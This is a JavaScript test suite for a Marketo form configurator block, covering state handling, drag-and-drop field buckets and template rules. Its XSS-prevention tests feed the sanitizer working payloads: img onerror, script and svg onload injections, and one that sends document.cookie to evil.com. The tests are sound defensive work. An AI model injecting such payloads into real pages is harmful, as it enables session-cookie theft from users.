import { readFile } from '@web/test-runner-commands';
import { expect } from '@esm-bundle/chai';
import { stub } from 'sinon';
import { delay, waitForElement } from '../../helpers/waitfor.js';
import init, { getDefaultStates, cleanPanelData, getConfigOptions } from '../../../libs/blocks/marketo-config/marketo-config.js';
import { sanitizeConfigValue, sanitizeHashConfig } from '../../../libs/blocks/marketo-config/context.js';
import {
  applyTemplate, deriveBuckets, deriveStepCount, moveField, toggleRequired,
  setFilter, setStepCount, isRequired, byId, STEP_PREF,
} from '../../../libs/blocks/marketo-config/field-map.js';
import { setConfig } from '../../../libs/utils/utils.js';

const innerHTML = await readFile({ path: './mocks/body.html' });
const options = JSON.parse(await readFile({ path: './mocks/options.json' }));
const templateRules = JSON.parse(await readFile({ path: './mocks/template-rules.json' }));
const config = { codeRoot: '/libs' };
const ogFetch = window.fetch;

setConfig(config);

const routedFetch = () => stub().callsFake((url) => Promise.resolve({
  ok: true,
  status: 200,
  json: () => Promise.resolve(String(url).includes('template-rules') ? templateRules : options),
}));

describe('marketo-config', () => {
  beforeEach(() => {
    document.body.innerHTML = innerHTML;
    localStorage.clear();
    window.fetch = routedFetch();
  });

  afterEach(() => {
    window.fetch = ogFetch;
  });

  it('cleans panel data correctly', () => {
    const data = [
      { prop: 'PROP1', required: 'YES' },
      { prop: 'PROP2', required: 'no' },
    ];
    const cleanedData = cleanPanelData(data);

    expect(cleanedData).to.deep.equal([
      { prop: 'prop1', required: 'yes' },
      { prop: 'prop2', required: 'no' },
    ]);
  });

  it('gets config options correctly', () => {
    const configOptions = getConfigOptions(options);
    expect(configOptions['Sheet 1'][0].prop).to.exist;
  });

  it('retrieves default states correctly', () => {
    const panelsData = getConfigOptions(options);
    const defaults = getDefaultStates(panelsData);

    expect(defaults).to.deep.equal({
      prop1: 'option1',
      prop2: '',
      prop3: '',
      prop4: '',
      'form.template': 'tmpl1',
      prop5: 'option1',
      prop6: '',
      prop7: 'option1',
      prop8: 'option1',
    });
  });

  it('shows error message', async () => {
    const el = document.querySelector('.marketo-config');
    window.fetch = stub().returns(
      new Promise((resolve) => {
        resolve({ ok: false, status: 500 });
      }),
    );
    await init(el);
    await delay(50);

    const content = await waitForElement('.error', { rootEl: el });
    expect(content.textContent).to.contain('Error');
  });

  it('renders correctly', async () => {
    const el = document.querySelector('.marketo-config');
    await init(el);

    const title = await waitForElement('.tool-title');
    expect(title.textContent).to.contain('Marketo Test Configurator');

    const accordion = await waitForElement('.accordion');
    expect(accordion).to.exist;

    const marketo = await waitForElement('iframe');
    expect(marketo).to.exist;
  });

  it('renders the Form Fields panel with the template dropdown', async () => {
    const el = document.querySelector('.marketo-config');
    await init(el);

    const panel = await waitForElement('.form-fields-panel');
    const templateSelect = panel.querySelector('select#form\\.template');
    expect(templateSelect).to.exist;
    expect(templateSelect.value).to.equal('tmpl1');
    // hidden bucket + at least one step bucket
    expect(panel.querySelectorAll('.ff-bucket').length).to.be.greaterThan(1);
  });

  it('seeds emitted state from the default template', async () => {
    const el = document.querySelector('.marketo-config');
    await init(el);
    await waitForElement('.form-fields-panel');
    await delay(50);

    const lsState = JSON.parse(localStorage.getItem('marketo-test-ConfiguratorState'));
    expect(lsState['field_visibility.name']).to.equal('required');
    expect(lsState['field_visibility.website']).to.equal('hidden');
    expect(lsState['field_filters.products']).to.equal('POI-Dxonly');
    expect(lsState['form.id']).to.equal('2277');
  });

  it('updates panel state and local storage', async () => {
    const el = document.querySelector('.marketo-config');
    await init(el);

    const accordion = await waitForElement('.accordion');
    const select = accordion.querySelector('#prop1');

    select.value = 'option2';
    select.dispatchEvent(new window.Event('change'));
    await delay(50);

    let lsState = JSON.parse(localStorage.getItem('marketo-test-ConfiguratorState'));
    expect(lsState.prop1).to.equal('option2');

    const input = accordion.querySelector('#prop3');
    input.value = 'input';
    input.dispatchEvent(new window.Event('change'));
    await delay(50);

    lsState = JSON.parse(localStorage.getItem('marketo-test-ConfiguratorState'));
    expect(lsState.prop3).to.equal('input');
  });

  it('drag-and-drop moves a field between buckets', async () => {
    const el = document.querySelector('.marketo-config');
    await init(el);
    const panel = await waitForElement('.form-fields-panel');
    await delay(50);

    // company is shown+required under tmpl1; drag it to the Hidden bucket.
    const chip = panel.querySelector('.ff-chip[data-field="company"]');
    const hiddenBucket = panel.querySelector('.ff-bucket[data-bucket="hidden"]');
    expect(chip).to.exist;

    const dataTransfer = new DataTransfer();
    chip.dispatchEvent(new DragEvent('dragstart', { dataTransfer, bubbles: true }));
    hiddenBucket.dispatchEvent(new DragEvent('drop', { dataTransfer, bubbles: true }));
    await delay(50);

    const lsState = JSON.parse(localStorage.getItem('marketo-test-ConfiguratorState'));
    expect(lsState['field_visibility.company']).to.equal('hidden');
    expect(panel.querySelector('.ff-bucket[data-bucket="hidden"] .ff-chip[data-field="company"]')).to.exist;
  });

  it('switching template re-seeds the buckets', async () => {
    const el = document.querySelector('.marketo-config');
    await init(el);
    const panel = await waitForElement('.form-fields-panel');
    await delay(50);

    const templateSelect = panel.querySelector('select#form\\.template');
    templateSelect.value = 'tmpl2';
    templateSelect.dispatchEvent(new window.Event('change'));
    await delay(50);

    const lsState = JSON.parse(localStorage.getItem('marketo-test-ConfiguratorState'));
    expect(lsState['field_visibility.name']).to.equal('hidden');
    expect(lsState['form.subtype']).to.equal('subscribe');
  });

  it('validate config and copy', async () => {
    const el = document.querySelector('.marketo-config');
    await init(el);
    const accordion = await waitForElement('.accordion');
    const copyBtn = await waitForElement('.copy-button');
    const select = accordion.querySelector('select#prop2');
    const input = accordion.querySelector('input#prop3');

    select.value = 'option2';
    select.dispatchEvent(new window.Event('change'));
    await delay(50);

    const copyButton = copyBtn.querySelector('.copy-config');
    copyButton.click();
    await delay(50);

    const message = copyBtn.querySelector('.message');
    expect(message.textContent).to.contain('Required fields must be filled');

    input.value = 'input';
    input.dispatchEvent(new window.Event('change'));
    await delay(50);

    copyButton.click();
    await delay(50);

    const copyContent = copyBtn.querySelector('.copy-content');
    expect(copyContent.textContent).to.contain('http');
  });

  describe('sanitizeConfigValue (XSS prevention)', () => {
    it('strips img onerror payload (the reported attack vector)', () => {
      const result = sanitizeConfigValue('"><img src=x onerror=eval(top.name)>');
      expect(result).to.not.include('<img');
      expect(result).to.not.include('onerror');
    });

    it('strips HTML tags but preserves their text content', () => {
      const result = sanitizeConfigValue('<script>alert(1)</script>');
      expect(result).to.not.include('<script>');
      expect(result).to.not.include('</script>');
    });

    it('strips svg onload attack vector', () => {
      const result = sanitizeConfigValue('<svg onload=alert(1)>');
      expect(result).to.not.include('<svg');
      expect(result).to.not.include('onload');
    });

    it('preserves plain text values unchanged', () => {
      expect(sanitizeConfigValue('Request a Demo')).to.equal('Request a Demo');
      expect(sanitizeConfigValue('https://example.com/thank-you')).to.equal('https://example.com/thank-you');
      expect(sanitizeConfigValue('')).to.equal('');
    });

    it('passes through non-string values unchanged', () => {
      expect(sanitizeConfigValue(42)).to.equal(42);
      expect(sanitizeConfigValue(null)).to.equal(null);
      expect(sanitizeConfigValue(undefined)).to.equal(undefined);
    });
  });

  describe('sanitizeHashConfig (XSS prevention)', () => {
    it('strips HTML injection from cta.override and success.content (the reported attack)', () => {
      const maliciousConfig = {
        'form.cta.override': '"><img src=x onerror=eval(top.name)>',
        'form.success.content': '<svg onload=fetch("//evil.com?c="+document.cookie)>',
        'form.template': 'flex_contact',
      };
      const result = sanitizeHashConfig(maliciousConfig);
      expect(result['form.cta.override']).to.not.include('<img');
      expect(result['form.cta.override']).to.not.include('onerror');
      expect(result['form.success.content']).to.not.include('<svg');
      expect(result['form.success.content']).to.not.include('onload');
      expect(result['form.template']).to.equal('flex_contact');
    });

    it('returns null/undefined config unchanged', () => {
      expect(sanitizeHashConfig(null)).to.equal(null);
      expect(sanitizeHashConfig(undefined)).to.equal(undefined);
    });
  });

  it('resets to default state', async () => {
    const el = document.querySelector('.marketo-config');
    await init(el);

    const accordion = await waitForElement('.accordion');
    await delay(50); // let the default template seed settle before resetting

    const resetButton = accordion.querySelector('.resetToDefaultState');
    resetButton.click();

    await delay(50);

    const lsState = JSON.parse(localStorage.getItem('marketo-test-ConfiguratorState'));

    const panelsData = getConfigOptions(options);
    const defaults = getDefaultStates(panelsData);
    expect(lsState).to.deep.equal(defaults);
  });
});

describe('field-map', () => {
  const seeded = () => applyTemplate('tmpl1', templateRules, 1);

  it('applyTemplate emits visibility, filters, form meta and a step distribution', () => {
    const patch = seeded();
    expect(patch['form.template']).to.equal('tmpl1');
    expect(patch['form.id']).to.equal('2277');
    expect(patch['form.subtype']).to.equal('request_for_information');
    expect(patch['field_visibility.name']).to.equal('required');
    expect(patch['field_visibility.website']).to.equal('hidden');
    expect(patch['field_filters.products']).to.equal('POI-Dxonly');
    // count 1 → every shown field lands in step 1
    expect(patch[STEP_PREF][1]).to.include('name');
    expect(patch[STEP_PREF][2]).to.have.length(0);
  });

  it('applyTemplate at count 3 distributes by defaultStep', () => {
    const patch = applyTemplate('tmpl1', templateRules, 3);
    expect(patch[STEP_PREF][1]).to.include('email').and.include('country');
    expect(patch[STEP_PREF][2]).to.include('name'); // name defaultStep 2
    expect(patch[STEP_PREF][3]).to.include('company'); // company defaultStep 3
  });

  it('deriveBuckets puts hidden fields in hidden and shown fields in their step', () => {
    const buckets = deriveBuckets(applyTemplate('tmpl1', templateRules, 3));
    expect(buckets.hidden).to.include('website').and.include('comments');
    expect(buckets[2]).to.include('name');
    expect(buckets[3]).to.include('company');
  });

  it('moveField to hidden hides a visibility field and drops it from steps', () => {
    const state = applyTemplate('tmpl1', templateRules, 2);
    const patch = moveField(state, 'name', 'hidden');
    expect(patch['field_visibility.name']).to.equal('hidden');
    const allSteps = [1, 2, 3].flatMap((s) => patch[STEP_PREF][s]);
    expect(allSteps).to.not.include('name');
  });

  it('moveField from hidden into a step makes it visible', () => {
    const state = applyTemplate('tmpl1', templateRules, 2);
    const patch = moveField(state, 'website', 2);
    expect(patch['field_visibility.website']).to.equal('visible');
    expect(patch[STEP_PREF][2]).to.include('mktodemandbaseWebsite');
  });

  it('locked fields cannot be hidden', () => {
    const state = applyTemplate('tmpl1', templateRules, 2);
    expect(moveField(state, 'email', 'hidden')).to.deep.equal({});
  });

  it('toggleRequired flips visible/required and ignores comments/demo', () => {
    const state = { 'field_visibility.name': 'visible' };
    expect(toggleRequired(state, 'name')['field_visibility.name']).to.equal('required');
    expect(toggleRequired({ 'field_visibility.name': 'required' }, 'name')['field_visibility.name']).to.equal('visible');
    expect(toggleRequired({ 'field_visibility.name': 'hidden' }, 'name')).to.deep.equal({});
    expect(toggleRequired({ 'field_visibility.comments': 'visible' }, 'comments')).to.deep.equal({});
  });

  it('filter fields are required whenever shown', () => {
    const shown = { 'field_filters.products': 'POI-Dxonly' };
    const hidden = { 'field_filters.products': 'hidden' };
    expect(isRequired(shown, byId.products)).to.equal(true);
    expect(isRequired(hidden, byId.products)).to.equal(false);
  });

  it('setFilter sets a filter value and hides on "hidden"', () => {
    const state = applyTemplate('tmpl1', templateRules, 2);
    expect(setFilter(state, 'products', 'POI-Combined')['field_filters.products']).to.equal('POI-Combined');
    expect(setFilter(state, 'products', 'hidden')['field_filters.products']).to.equal('hidden');
  });

  it('company_type follows products placement', () => {
    const patch = applyTemplate('tmpl1', templateRules, 3);
    const productsStep = [1, 2, 3].find((s) => patch[STEP_PREF][s].includes('mktoFormsPrimaryProductInterest'));
    expect(patch[STEP_PREF][productsStep]).to.include('mktoFormsCompanyType');
    // hidden when products hidden
    const hiddenPatch = moveField(patch, 'products', 'hidden');
    const stillThere = [1, 2, 3].some((s) => hiddenPatch[STEP_PREF][s].includes('mktoFormsCompanyType'));
    expect(stillThere).to.equal(false);
  });

  it('setStepCount merges higher steps down (re-defaults distribution)', () => {
    const state = applyTemplate('tmpl1', templateRules, 3);
    const patch = setStepCount(state, 1);
    expect(patch[STEP_PREF][2]).to.have.length(0);
    expect(patch[STEP_PREF][3]).to.have.length(0);
    expect(patch[STEP_PREF][1]).to.include('company');
  });

  it('deriveStepCount reads the highest non-empty step', () => {
    expect(deriveStepCount(applyTemplate('tmpl1', templateRules, 1))).to.equal(1);
    expect(deriveStepCount(applyTemplate('tmpl1', templateRules, 3))).to.equal(3);
  });
});
